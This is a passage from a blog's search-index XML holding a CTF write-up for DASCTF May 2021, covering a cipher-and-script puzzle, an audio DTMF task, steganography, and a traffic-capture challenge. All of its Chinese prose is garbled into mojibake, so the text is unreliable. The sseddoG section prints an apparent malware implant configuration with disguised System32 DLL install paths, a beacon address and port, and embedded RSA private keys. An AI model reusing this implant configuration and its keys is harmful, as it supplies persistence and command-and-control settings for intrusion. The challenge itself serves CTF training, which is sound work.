çš„é¢˜ç›®å¤ªé¡¶äº†ï¼Œå–µå–µå¥½èœç©ä¸æ¥ï¼Œå–µå‘œå‘œå‘œã€‚</p><p>ï¼ˆçœ‹å•¥æ—¶å€™æœ‰æœºä¼šå†æ‘¸é±¼æ¥å¤ç°å§ï¼Œå–µå–µğŸ±</p><p><em>ï¼ˆæºœäº†æºœäº†å–µ</em></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> WriteUp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF | 2021 DASCTF May WriteUp</title>
      <link href="2021/05/30/CTF_2021DASCTF_May/"/>
      <url>2021/05/30/CTF_2021DASCTF_May/</url>
      
        <content type="html"><![CDATA[<p><img src="/2021/05/30/CTF_2021DASCTF_May/banner_1.png"></p><h2 id="å¼•è¨€"><a href="#å¼•è¨€" class="headerlink" title="å¼•è¨€"></a>å¼•è¨€</h2><blockquote><p><strong>DASCTF May</strong></p><p>2021å¹´5æœˆ29æ—¥ 10:00-18:00</p><p><a href="https://buuoj.cn/">https://buuoj.cn/</a></p></blockquote><p>è¿™å‘¨æœ«å¥½å•Šï¼Œç‰¹åˆ«æ˜¯5æœˆ29æ—¥çœŸæ˜¯ä¸ªå¥½æ—¥å­ï¼Œä¸€å †æ¯”èµ›å…¨å †åœ¨è¿™å¤©äº†â€¦â€¦</p><p>æ¯”å¦‚ DASCTF Mayã€æ˜¥ç§‹æ¯ã€XCTF finalã€DozerCTFï¼Œbalabalaã€‚</p><p>å‡ ä¸ªæ¯”èµ›é¢˜ç›®å¤§æ¦‚çœ‹äº†çœ‹ï¼ŒDASCTF May è¿™æ¬¡æ¯”è¾ƒåŸºç¡€ï¼ˆèµµæ€»è²Œä¼¼ä¹Ÿè¯´æ˜¯ä¸ºäº†æµ‹è¯• buuoj çš„ matches æ–°æ¨¡å—ï¼‰ï¼Œè¿™é‡Œå°±éšæ„å†™å†™å½“ä½œåšé¢˜è®°å½•å¥½äº†ã€‚</p><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="Holmes"><a href="#Holmes" class="headerlink" title="Holmes"></a>Holmes</h3><blockquote><p>Do you know Holmes?</p></blockquote><p><img src="/2021/05/30/CTF_2021DASCTF_May/holmes.jpg" alt="holmes"></p><p>æ–‡ä»¶ç»“å°¾ä¸€ä¸ª rar å‹ç¼©åŒ…</p><p>å›¾ç‰‡ä¸Šæ˜¯ä¸ªè·³èˆçš„å°äººå¯†ç ï¼Œå‚è€ƒä¸‹å›¾ã€‚</p><p><img src="/2021/05/30/CTF_2021DASCTF_May/v2-bfa0f0835ce4a7ec0dae25be5c3d40a4_720w.jpg"></p><p>å¾—åˆ°å¯†ç ä¸º <code>YOYAREHOLMES</code>ï¼Œç„¶è€Œå¹¶ä¸å¯¹ï¼Œæ ¹æ®æ„æ€åº”è¯¥æ˜¯ <code>YOUAREHOLMES</code></p><p>è§£å‹å¾—åˆ° <code>flag.py</code></p><pre class="language-python" data-language="python"><code class="language-python">flag<span class="token operator">=</span><span class="token string">"flag{********************************}"</span>encflag<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    encflag<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>flag<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span>i<span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">128</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>encflag<span class="token punctuation">)</span><span class="token triple-quoted-string string">'''[102, 109, 99, 106, 127, 57, 60, 104, 60, 107, 61, 62, 65, 68, 115, 64, 67, 119, 66, 74, 73, 74, 119, 75, 74, 79, 79,76, 78, 82, 78, 85, 83, 84, 82, 86, 92, 34]'''</span></code></pre><p>é€†ç€å†™è„šæœ¬è§£å¯†å°±å¥½ã€‚</p><pre class="language-python" data-language="python"><code class="language-python">l <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">102</span><span class="token punctuation">,</span> <span class="token number">109</span><span class="token punctuation">,</span> <span class="token number">99</span><span class="token punctuation">,</span> <span class="token number">106</span><span class="token punctuation">,</span> <span class="token number">127</span><span class="token punctuation">,</span> <span class="token number">57</span><span class="token punctuation">,</span> <span class="token number">60</span><span class="token punctuation">,</span> <span class="token number">104</span><span class="token punctuation">,</span> <span class="token number">60</span><span class="token punctuation">,</span> <span class="token number">107</span><span class="token punctuation">,</span> <span class="token number">61</span><span class="token punctuation">,</span> <span class="token number">62</span><span class="token punctuation">,</span> <span class="token number">65</span><span class="token punctuation">,</span> <span class="token number">68</span><span class="token punctuation">,</span> <span class="token number">115</span><span class="token punctuation">,</span> <span class="token number">64</span><span class="token punctuation">,</span> <span class="token number">67</span><span class="token punctuation">,</span> <span class="token number">119</span><span class="token punctuation">,</span> <span class="token number">66</span><span class="token punctuation">,</span> <span class="token number">74</span><span class="token punctuation">,</span> <span class="token number">73</span><span class="token punctuation">,</span> <span class="token number">74</span><span class="token punctuation">,</span> <span class="token number">119</span><span class="token punctuation">,</span> <span class="token number">75</span><span class="token punctuation">,</span> <span class="token number">74</span><span class="token punctuation">,</span> <span class="token number">79</span><span class="token punctuation">,</span> <span class="token number">79</span><span class="token punctuation">,</span>     <span class="token number">76</span><span class="token punctuation">,</span> <span class="token number">78</span><span class="token punctuation">,</span> <span class="token number">82</span><span class="token punctuation">,</span> <span class="token number">78</span><span class="token punctuation">,</span> <span class="token number">85</span><span class="token punctuation">,</span> <span class="token number">83</span><span class="token punctuation">,</span> <span class="token number">84</span><span class="token punctuation">,</span> <span class="token number">82</span><span class="token punctuation">,</span> <span class="token number">86</span><span class="token punctuation">,</span> <span class="token number">92</span><span class="token punctuation">,</span> <span class="token number">34</span><span class="token punctuation">]</span>flag <span class="token operator">=</span> <span class="token string">''</span><span class="token keyword">for</span> k<span class="token punctuation">,</span> v <span class="token keyword">in</span> <span class="token builtin">enumerate</span><span class="token punctuation">(</span>l<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        s <span class="token operator">=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>v<span class="token operator">-</span>k<span class="token punctuation">)</span>    <span class="token keyword">except</span><span class="token punctuation">:</span>        s <span class="token operator">=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>v<span class="token operator">-</span>k<span class="token operator">+</span><span class="token number">128</span><span class="token punctuation">)</span>    flag <span class="token operator">+=</span> s    <span class="token keyword">print</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> flag<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span></code></pre><p><code>flag{46a4b3357e13f0755a42651250633038}</code></p><h3 id="rickroll-u"><a href="#rickroll-u" class="headerlink" title="rickroll_u"></a>rickroll_u</h3><blockquote><p>we will rickroll you!ï¼ˆflagå†…å®¹ä¸ºå­—æ¯æ•°å­—ç»„åˆï¼Œè¯·MD5åæäº¤ã€‚ï¼‰ </p><p>é“¾æ¥: <a href="https://pan.baidu.com/s/1JJ8AtqFJVFa6u9z7RKunPw">https://pan.baidu.com/s/1JJ8AtqFJVFa6u9z7RKunPw</a>  å¯†ç : nwld</p></blockquote><p>å‹ç¼©åŒ…æ˜æ–‡è§£å¯†ï¼Œå…ˆæŠŠ <code>ah_old_time.txt</code> ä»¥ä¸å‹ç¼©çš„æ–¹å¼å¼„æˆä¸€ä¸ªå‹ç¼©åŒ…ã€‚</p><p>è·‘å‡ºæ¥å¯†ç æ˜¯ <code>t!m32R1</code>ã€‚</p><p>è§£å‹å‡ºæ¥æœ‰ä¸ªéŸ³é¢‘æ–‡ä»¶ <code>rickroll_u.wav</code></p><p>å¥½å®¶ä¼™ï¼Œæ˜¯é‚£ä¸ªç†æŸ¥å¾·Â·è‰¾æ–¯åˆ©çš„ Never Gonna Give You Upï¼Œå¤ªç»å…¸å•¦ã€‚</p><p>æ–‡ä»¶ç»“å°¾è¿˜æœ‰ä¸ª wavï¼Œæ‰‹åŠ¨æå–å‡ºæ¥ã€‚</p><p>å‘ç°æ˜¯ä¸ª DTMF.</p><p><img src="/2021/05/30/CTF_2021DASCTF_May/image-20210529170303618.png"></p><p>æå–å‡ºæ¥æ˜¯ <code>0916A639</code>ã€‚å‘ç° md5 æäº¤ä¸Šå»ä¸å¯¹ã€‚</p><p>æœ€åå‘ç°å­—æ¯æ˜¯å°å†™ã€‚ã€‚ã€‚<code>0916a639</code></p><p>md5 =&gt; <code>c8c15a11dd2852cbe63df405debc9d41</code></p><p>ç›´æ¥äº¤ä¸Šå»å°±è¡Œã€‚</p><h3 id="DCT-domain-steganography-amp-crack"><a href="#DCT-domain-steganography-amp-crack" class="headerlink" title="DCT domain  steganography &amp; crack"></a>DCT domain  steganography &amp; crack</h3><blockquote><p>hint1é“¾æ¥: <a href="https://pan.baidu.com/s/1obhR1KqUv2VCuyC0Qy62AQ">https://pan.baidu.com/s/1obhR1KqUv2VCuyC0Qy62AQ</a>  å¯†ç : t86j </p><p>è¿™é‡Œæœ‰ä¸ª top 1000 å¯†ç </p></blockquote><p>å¼€å±€ä¸€å¼ å›¾â€¦â€¦</p><p><img src="/2021/05/30/CTF_2021DASCTF_May/out.jpg" alt="out"></p><p>DCT åŸŸéšå†™çš„æœ‰å¥½å‡ ä¸ªå·¥å…·æ¥ç€ï¼Œç»™äº†ä¸ª top1000 å¯†ç åº”è¯¥å°±æ˜¯ç”¨æ¥è§£å¯†çš„å¯†é’¥äº†ã€‚</p><p>ï¼ˆæ„Ÿè§‰æ²¡æ„æ€ï¼Œæ²¡å¾€ååšäº†ï¼Œåæ¥ç¾¤é‡Œè¯´æ˜¯ outguess</p><h3 id="sseddoG"><a href="#sseddoG" class="headerlink" title="sseddoG"></a>sseddoG</h3><p>ä¸‹è½½ä¸‹æ¥æ˜¯ä¸ªæµé‡åŒ…ï¼Œæå–å‡ºæ¥æœ‰ä¸ª<code>Athena.png</code> ç»“å°¾æ‹¼æ¥äº†ä¸ª xmlï¼Œé‡Œé¢æœ‰å…¬é’¥å’Œç§é’¥ã€‚</p><pre class="language-xml" data-language="xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>ATHENA</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>TASKING</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>COMMAND_EXECUTE_TIMEOUT</span><span class="token punctuation">&gt;</span></span>10<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>COMMAND_EXECUTE_TIMEOUT</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>STATE_FILE_PATH</span><span class="token punctuation">&gt;</span></span>.\STATE_FILES<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>STATE_FILE_PATH</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>MAX_CPU_UTILIZATION</span><span class="token punctuation">&gt;</span></span>40<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>MAX_CPU_UTILIZATION</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>MAX_PROCESSING_DATA_SIZE</span><span class="token punctuation">&gt;</span></span>1000000<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>MAX_PROCESSING_DATA_SIZE</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>MAX_CHUNK_SIZE</span><span class="token punctuation">&gt;</span></span>0<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>MAX_CHUNK_SIZE</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>BATCH_EXECUTION_TIMEOUT</span><span class="token punctuation">&gt;</span></span>123<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>BATCH_EXECUTION_TIMEOUT</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>TASKING</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>INSTALL</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>RESTART_SERVICE</span><span class="token punctuation">&gt;</span></span>1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>RESTART_SERVICE</span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>TARGET_FILE_NAME</span><span class="token punctuation">&gt;</span></span>%SystemRoot%\System32\Microsoft\Crypto\RAS\iprcache.dll<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>TARGET_FILE_NAME</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>ORIGINAL_FILE_NAME</span><span class="token punctuation">&gt;</span></span>%SystemRoot%\System32\iprtrmgr.dll<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>ORIGINAL_FILE_NAME</span><span class="token punctuation">&gt;</span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>DATA_FILE_NAME</span><span class="token punctuation">&gt;</span></span>%SystemRoot%\System32\codeintegrity\ras.cache<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>DATA_FILE_NAME</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>INSTALL</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>UNINSTALL</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>KILL_FILE_PATH</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>KILL_FILE_PATH</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>DEAD_MAN_DELAY</span><span class="token punctuation">&gt;</span></span>0<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>DEAD_MAN_DELAY</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>BEACON_FAILURES</span><span class="token punctuation">&gt;</span></span>0<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>BEACON_FAILURES</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>DATE_AND_TIME</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>DATE_AND_TIME</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>UNINSTALL</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>BEACON</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>BOOT_DELAY</span><span class="token punctuation">&gt;</span></span>0<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>BOOT_DELAY</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>DOMAINS</span><span class="token punctuation">&gt;</span></span>10.3.2.56<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>DOMAINS</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>PORT</span><span class="token punctuation">&gt;</span></span>443<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>PORT</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>JITTER</span><span class="token punctuation">&gt;</span></span>0<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>JITTER</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>USER_AGENT_STRING</span><span class="token punctuation">&gt;</span></span>Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0)<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>USER_AGENT_STRING</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>ACCEPT_STRING</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>ACCEPT_STRING</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>INTERVAL</span><span class="token punctuation">&gt;</span></span>5<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>INTERVAL</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>TASKING_DELAY</span><span class="token punctuation">&gt;</span></span>0<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>TASKING_DELAY</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>PROXY_PORT</span><span class="token punctuation">&gt;</span></span>0<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>PROXY_PORT</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>HIBERNATION_DELAY</span><span class="token punctuation">&gt;</span></span>0<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>HIBERNATION_DELAY</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>ACCEPT_LANG_STRING</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>ACCEPT_LANG_STRING</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>IE_PROXY_ADDRESS</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>IE_PROXY_ADDRESS</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>URL_PATH</span><span class="token punctuation">&gt;</span></span>/octopus/<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>URL_PATH</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>ACCEPT_ENCODING_STRING</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>ACCEPT_ENCODING_STRING</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>WPAD_PROXY_ADDRESS</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>WPAD_PROXY_ADDRESS</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>BEACON</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>CLIENT_KEY</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>PUBLIC_KEY</span><span class="token punctuation">&gt;</span></span>-----BEGIN PUBLIC KEY-----MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAmN9l2LF50PqlGXwwk4AinAKHLyd5dpDVr9G7LqD2pi492zzIA9hgU2a+kLoV3+/VMbrI+Y0mp707Gifz9PB1mABAdppeTQyYyE9+KmnAjg1WuI/HDtMrfqzkXh8m4p2u1o8sWIOfFUpZxK1H5TMTDicdJ3UJ3NNkP3asIxFWRXNmQ2tdINtmViJufotE7lj9gCDRleZsm0Io8t12b90hTgd+aqKCRumIgdnOm6VW4dsHzClyAYaxz0JCpxBQffJ9rWRlPklkUJw5WrC8YoCbhdO7p3ZdizcDgazDC1/G4lwmvWC7v7c1PAeMX5DBkov4MwbX4aYQRqX5nxkegZOIpQIDAQAB-----END PUBLIC KEY-----<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>PUBLIC_KEY</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>PRIVATE_KEY</span><span class="token punctuation">&gt;</span></span>-----BEGIN RSA PRIVATE KEY-----MIIEowIBAAKCAQEAmN9l2LF50PqlGXwwk4AinAKHLyd5dpDVr9G7LqD2pi492zzIA9hgU2a+kLoV3+/VMbrI+Y0mp707Gifz9PB1mABAdppeTQyYyE9+KmnAjg1WuI/HDtMrfqzkXh8m4p2u1o8sWIOfFUpZxK1H5TMTDicdJ3UJ3NNkP3asIxFWRXNmQ2tdINtmViJufotE7lj9gCDRleZsm0Io8t12b90hTgd+aqKCRumIgdnOm6VW4dsHzClyAYaxz0JCpxBQffJ9rWRlPklkUJw5WrC8YoCbhdO7p3ZdizcDgazDC1/G4lwmvWC7v7c1PAeMX5DBkov4MwbX4aYQRqX5nxkegZOIpQIDAQABAoIBABjaCFaH04PTm09fTw5LgFTYXF2gDzDlLrfcYo+b/zzYu5mOcf2eCVrFkyk39yJmfMQO12kqNySBsL/5ysEA7jz9nX0qbzYbXCMEOUBv3Ku7I2Pxi6yvS5zWQnHCorGobKnYsJ7bFtuBMMK2YL+z498jIKwvbKEHhH6ErkstIFc9wQnl635zYLE3EywbD4ktyDholdfBFyTCwk1JGd/holAwGN78PldVc+K73m8E2Jo3VnN7TGOG7Fb5CS19xj7zcIE4cubhEH+w6RMURa592NjSd2iZEW5xjugIbTThmLbFOXaBioeXVWstW9VRzgTIfb3TlcssLtzZoAje0c9wrgECgYEAxvwc9hlEY8VABtoVrxxY7NtqRUh3B8jeKW4eCP8Ri0DiH9eYHL9RpJSBP///vWcOt4EBfvb1krp7HJgh/5bJlewuuEtR4WbFfqgfwLPbKjKE0D6TVQykAH4egcplynKqSdDwQvlghpqya69YmTx+S7qawr3aTUJ2Zvl/ldzrKEECgYEAxKzgOOLOJu5QHB3MPaE9HKcxU+xir2j0rCNyUOtN9dVXg/wdWOabatGfdhPa2xmgzlPcQzqLW5ZnIITjXYZIx7uctP2i5dhDm7NycthrTzykT7owHbMHX6Ey6qvup4K6EzwLuCKD7XoAz7ImfQvv6e2BYYhIqUfvQFAuitj652UCgYAUlSF9x1FOrKmZy9cwXNNJ9MxCTGObl4h7apuKvK+Y4uZA+vEOEDAmwQG5mAZhFhbsnliERJFUUxvG8mmZ4YQKkPqoL4pRsWq+Vi+qpDAIZl9clwxwYLVaI7GOJVxwG3pH1mfz1Y3Jfpj0EJguiZZayPuXJ0I8eaJ7tlUfMFHWwQKBgEIHD9fJPRCQ3VAzKMhgA1ZFQyg7qf3drJbF57EG7ktj7lefInMgKHk6GuDXVZhNCFF8kev4EaUT31dphbN2S6TSdY/FvxSPAFObcQbhZVVatIcXqOOvoQAX7DIguqR+HN4sQHr3C3eEiBUyZ/1/LnJIjDEkQdCjF81tndJ7efCJAoGBAJ3sgwKQUSdKhiduyok/qJ0Ye5EgJGuskUIsLeLVnShzYrAAUVJMIpLKOLXC8ygMyAp9gpusnS5obQjUKaB7livuqQ3OKEUvm9tyJbjMLfJoMGry7wjj0eiIF3OCoV5LfjIfAldn/k2KGGR6/LM1K2vi/wCo1wuHHwpWbndJwqF3-----END RSA PRIVATE KEY-----<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>PRIVATE_KEY</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>CLIENT_KEY</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>SERVER_KEY</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>PUBLIC_KEY</span><span class="token punctuation">&gt;</span></span>-----BEGIN PUBLIC KEY-----MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAmN9l2LF50PqlGXwwk4AinAKHLyd5dpDVr9G7LqD2pi492zzIA9hgU2a+kLoV3+/VMbrI+Y0mp707Gifz9PB1mABAdppeTQyYyE9+KmnAjg1WuI/HDtMrfqzkXh8m4p2u1o8sWIOfFUpZxK1H5TMTDicdJ3UJ3NNkP3asIxFWRXNmQ2tdINtmViJufotE7lj9gCDRleZsm0Io8t12b90hTgd+aqKCRumIgdnOm6VW4dsHzClyAYaxz0JCpxBQffJ9rWRlPklkUJw5WrC8YoCbhdO7p3ZdizcDgazDC1/G4lwmvWC7v7c1PAeMX5DBkov4MwbX4aYQRqX5nxkegZOIpQIDAQAB-----END PUBLIC KEY-----<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>PUBLIC_KEY</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>PRIVATE_KEY</span><span class="token punctuation">&gt;</span></span>-----BEGIN RSA PRIVATE KEY-----MIIEowIBAAKCAQEAmN9l2LF50PqlGXwwk4AinAKHLyd5dpDVr9G7LqD2pi492zzIA9hgU2a+kLoV3+/VMbrI+Y0mp707Gifz9PB1mABAdppeTQyYyE9+KmnAjg1WuI/HDtMrfqzkXh8m4p2u1o8sWIOfFUpZxK1H5TMTDicdJ3UJ3NNkP3asIxFWRXNmQ2tdINtmViJufotE7lj9gCDRleZsm0Io8t12b90hTgd+aqKCRumIgdnOm6VW4dsHzClyAYaxz0JCpxBQffJ9rWRlPklkUJw5WrC8YoCbhdO7p3ZdizcDgazDC1/G4lwmvWC7v7c1PAeMX5DBkov4MwbX4aYQRqX5nxkegZOIpQIDAQABAoIBABjaCFaH04PTm09fTw5LgFTYXF2gDzDlLrfcYo+b/zzYu5mOcf2eCVrFkyk39yJmfMQO12kqNySBsL/5ysEA7jz9nX0qbzYbXCMEOUBv3Ku7I2Pxi6yvS5zWQnHCorGobKnYsJ7bFtuBMMK2YL+z498jIKwvbKEHhH6ErkstIFc9wQnl635zYLE3EywbD4ktyDholdfBFyTCwk1JGd/holAwGN78PldVc+K73m8E2Jo3VnN7TGOG7Fb5CS19xj7zcIE4cubhEH+w6RMURa592NjSd2iZEW5xjugIbTThmLbFOXaBioeXVWstW9VRzgTIfb3TlcssLtzZoAje0c9wrgECgYEAxvwc9hlEY8VABtoVrxxY7NtqRUh3B8jeKW4eCP8Ri0DiH9eYHL9RpJSBP///vWcOt4EBfvb1krp7HJgh/5bJlewuuEtR4WbFfqgfwLPbKjKE0D6TVQykAH4egcplynKqSdDwQvlghpqya69YmTx+S7qawr3aTUJ2Zvl/ldzrKEECgYEAxKzgOOLOJu5QHB3MPaE9HKcxU+xir2j0rCNyUOtN9dVXg/wdWOabatGfdhPa2xmgzlPcQzqLW5ZnIITjXYZIx7uctP2i5dhDm7NycthrTzykT7owHbMHX6Ey6qvup4K6EzwLuCKD7XoAz7ImfQvv6e2BYYhIqUfvQFAuitj652UCgYAUlSF9x1FOrKmZy9cwXNNJ9MxCTGObl4h7apuKvK+Y4uZA+vEOEDAmwQG5mAZhFhbsnliERJFUUxvG8mmZ4YQKkPqoL4pRsWq+Vi+qpDAIZl9clwxwYLVaI7GOJVxwG3pH1mfz1Y3Jfpj0EJguiZZayPuXJ0I8eaJ7tlUfMFHWwQKBgEIHD9fJPRCQ3VAzKMhgA1ZFQyg7qf3drJbF57EG7ktj7lefInMgKHk6GuDXVZhNCFF8kev4EaUT31dphbN2S6TSdY/FvxSPAFObcQbhZVVatIcXqOOvoQAX7DIguqR+HN4sQHr3C3eEiBUyZ/1/LnJIjDEkQdCjF81tndJ7efCJAoGBAJ3sgwKQUSdKhiduyok/qJ0Ye5EgJGuskUIsLeLVnShzYrAAUVJMIpLKOLXC8ygMyAp9gpusnS5obQjUKaB7livuqQ3OKEUvm9tyJbjMLfJoMGry7wjj0eiIF3OCoV5LfjIfAldn/k2KGGR6/LM1K2vi/wCo1wuHHwpWbndJwqF3-----END RSA PRIVATE KEY-----<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>PRIVATE_KEY</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>SERVER_KEY</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>SOURCE</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>FLAG?</span><span class="token punctuation">&gt;</span></span>TheyWereBelieversInTheGoddess<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>FLAG?</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>SOURCE</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>TARGET</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>CHILD_ID</span><span class="token punctuation">&gt;</span></span>0xABCD0064<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>CHILD_ID</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>DYN_CONFIG_TYPE</span><span class="token 